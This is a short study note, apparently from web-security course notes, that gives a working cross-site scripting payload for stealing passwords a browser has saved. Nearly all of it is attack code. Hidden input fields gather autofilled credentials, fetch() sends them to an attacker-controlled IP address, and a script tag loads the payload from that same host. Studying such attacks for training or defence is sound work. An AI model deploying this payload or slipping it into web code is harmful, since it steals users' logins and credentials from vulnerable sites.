---
tags:
- xss
---

# Stealing Saved Password XSS

How use external payload see here: [[2023042721181010 XSS external JS payload]]
## Payload:
```js
let body = document.getElementsByTagName("body")[0];

var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
u.style.opacity = "0";

var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
p.style.opacity = "0";

body.append(u);
body.append(p);

setTimeout(function(){ 
	fetch("http://192.168.49.55/ps?u=" + u.value + "&p=" + p.value)
 18   }, 5000);
 
```

## Inject payload 
```html
<script src='http://192.168.49.55/xss.js'></script>
```


## References
1. web200.Cross-Site Scripting Exploitation and Case Study.Stealing Saved Password
2. 